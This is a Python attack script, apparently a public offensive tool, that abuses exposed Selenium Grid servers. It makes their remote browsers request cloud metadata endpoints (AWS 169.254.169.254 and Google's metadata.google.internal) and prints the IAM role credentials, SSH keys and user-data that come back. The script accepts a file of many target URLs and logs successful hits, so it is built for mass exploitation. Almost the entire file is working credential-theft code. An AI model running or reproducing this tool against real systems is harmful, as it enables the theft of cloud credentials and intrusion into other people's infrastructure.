#!/usr/bin/env python
#
# sel.py
# Abuse Selenium for AWS Info
#
# Author: @random_robbie

import requests
import urllib3
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.common.exceptions import TimeoutException
from time import sleep
import argparse
import os
import sys
from pathlib import Path

# Disable SSL warnings for testing purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()


def strip_html(html_content):
	"""
	Remove HTML tags from Selenium page source.

	Args:
		html_content: Raw HTML string from page source

	Returns:
		Cleaned string with HTML tags removed
	"""
	result = html_content
	# Remove common HTML wrappers added by Selenium
	tags_to_remove = [
		'<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">',
		'<html><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">',
		'<pre style="word-wrap: break-word; white-space: pre-wrap;">',
		'</pre></body></html>',
	]
	for tag in tags_to_remove:
		result = result.replace(tag, '')
	return result



def grab_test(url, desired_caps):
	"""
	Test if the Selenium Grid instance is running on a cloud provider.

	Args:
		url: The Selenium Grid URL
		desired_caps: Selenium desired capabilities

	Returns:
		"amazon" if AWS, "google" if GCP, False otherwise
	"""
	grid_url = f"{url}/wd/hub"
	driver = None
	try:
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.set_page_load_timeout(10)
		driver.get("http://ipinfo.io/json")
		page_content = strip_html(driver.page_source)

		if 'amazonaws' in page_content:
			print(f"\n\n[*] Amazon Host found\n  {page_content} [*]")
			return "amazon"
		elif 'google' in page_content:
			print(f"\n\n[*] Google Host Found\n  {page_content} [*]")
			return "google"
		else:
			print("\n\n[*] Non-Cloud Host [*]")
			return False
	except TimeoutException:
		print("[*] Timeout connecting to target [*]")
		return False
	except Exception as e:
		print(f"[*] Error testing target: {e} [*]")
		return False
	finally:
		if driver:
			try:
				driver.quit()
			except Exception:
				pass

	

def grab_sshgoogle(url, desired_caps):
	"""
	Retrieve SSH keys from Google Cloud metadata endpoint.

	Args:
		url: The Selenium Grid URL
		desired_caps: Selenium desired capabilities
	"""
	grid_url = f"{url}/wd/hub"
	driver = None
	try:
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.set_page_load_timeout(10)
		driver.get("http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json")
		page_content = strip_html(driver.page_source)
		if 'ssh' in page_content:
			print(f"\n\n[*] Google Public SSH Key:\n  {page_content} [*]")
		else:
			print("\n\n[*] Unable to get SSH Key [*]")
	except Exception as e:
		print(f"[*] Error retrieving Google SSH keys: {e} [*]")
	finally:
		if driver:
			try:
				driver.quit()
			except Exception:
				pass

def grab_sshkeys(url, desired_caps):
	"""
	Retrieve SSH keys from AWS metadata endpoint.

	Args:
		url: The Selenium Grid URL
		desired_caps: Selenium desired capabilities
	"""
	grid_url = f"{url}/wd/hub"
	driver = None
	try:
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.set_page_load_timeout(10)
		driver.get("http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key")
		page_content = strip_html(driver.page_source)
		if 'ssh-rsa' in page_content:
			print(f"\n\n[*] AWS Public SSH Key:\n  {page_content} [*]")
			# Ensure output directory exists
			output_dir = Path("output")
			output_dir.mkdir(exist_ok=True)
			# Log successful target
			output_file = output_dir / "server.txt"
			with open(output_file, "a") as f:
				f.write(f"{url}\n")
		else:
			print("\n\n[*] Unable to get SSH Key [*]")
	except Exception as e:
		print(f"[*] Error retrieving AWS SSH keys: {e} [*]")
	finally:
		if driver:
			try:
				driver.quit()
			except Exception:
				pass
		
		
		
def grab_userdata(url, desired_caps):
	"""
	Retrieve user data from AWS metadata endpoint.

	Args:
		url: The Selenium Grid URL
		desired_caps: Selenium desired capabilities
	"""
	grid_url = f"{url}/wd/hub"
	driver = None
	try:
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.set_page_load_timeout(10)
		driver.get("http://169.254.169.254/latest/")
		page_content = strip_html(driver.page_source)
		if 'user-data' in page_content:
			driver.get("http://169.254.169.254/latest/user-data")
			user_data = strip_html(driver.page_source)
			print(f"\n\n[*] User Data:\n{user_data}\n[*]")
		else:
			print("\n\n[*] No User Data [*]\n")
	except Exception as e:
		print(f"[*] Error retrieving user data: {e} [*]")
	finally:
		if driver:
			try:
				driver.quit()
			except Exception:
				pass	
	
	
def grab_iam(url, desired_caps):
	"""
	Retrieve IAM role credentials from AWS metadata endpoint.

	Args:
		url: The Selenium Grid URL
		desired_caps: Selenium desired capabilities
	"""
	grid_url = f"{url}/wd/hub"
	driver = None
	try:
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.set_page_load_timeout(10)
		driver.get("http://169.254.169.254/latest/meta-data/")
		page_content = strip_html(driver.page_source)
		if 'iam' in page_content:
			driver.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
			role_name = strip_html(driver.page_source)
			print(f"[*] IAM Role Name: {role_name} [*]")
			driver.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}/")
			credentials = strip_html(driver.page_source)
			print(f"[*] IAM Role Key: {credentials} \n[*]")
		else:
			print("\n\n[*] No IAM Role [*]\n")
	except Exception as e:
		print(f"[*] Error retrieving IAM credentials: {e} [*]")
	finally:
		if driver:
			try:
				driver.quit()
			except Exception:
				pass


def process_target(url, desired_caps):
	"""
	Process a single target URL to detect cloud provider and extract metadata.

	Args:
		url: The Selenium Grid URL to test
		desired_caps: Selenium desired capabilities
	"""
	cloud_type = grab_test(url, desired_caps)
	if cloud_type == "amazon":
		grab_iam(url, desired_caps)
		grab_sshkeys(url, desired_caps)
		grab_userdata(url, desired_caps)
	elif cloud_type == "google":
		grab_sshgoogle(url, desired_caps)
	else:
		print("[*] Not Cloud Hosted [*]\n\n")


def main():
	"""Main execution function."""
	parser = argparse.ArgumentParser(
		description="Selenium Grid/Node metadata endpoint testing tool"
	)
	parser.add_argument(
		"-u", "--url",
		required=False,
		default="http://localhost",
		help="URL to test (default: http://localhost)"
	)
	parser.add_argument(
		"-f", "--file",
		default="",
		required=False,
		help="File containing list of URLs to test (one per line)"
	)
	args = parser.parse_args()

	desired_caps = DesiredCapabilities.CHROME

	if args.file:
		# Process URLs from file
		file_path = Path(args.file)
		if not file_path.exists():
			print(f"[!] Error: File '{args.file}' not found")
			sys.exit(1)

		with open(file_path, 'r') as f:
			for line in f:
				url = line.strip()
				if not url or url.startswith('#'):
					continue  # Skip empty lines and comments
				try:
					print(f"\n[*] Testing: {url} [*]")
					process_target(url, desired_caps)
				except KeyboardInterrupt:
					print("\n[!] Ctrl-C pressed, exiting...")
					sys.exit(0)
				except Exception as e:
					print(f"[!] Error processing {url}: {e}")
	else:
		# Process single URL
		print(f"\n[*] Testing: {args.url} [*]")
		try:
			process_target(args.url, desired_caps)
		except Exception as e:
			print(f"[!] Error: {e}")
			sys.exit(1)


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("\n[!] Interrupted by user")
		sys.exit(0)
	except Exception as e:
		print(f"[!] Fatal error: {e}")
		sys.exit(1)
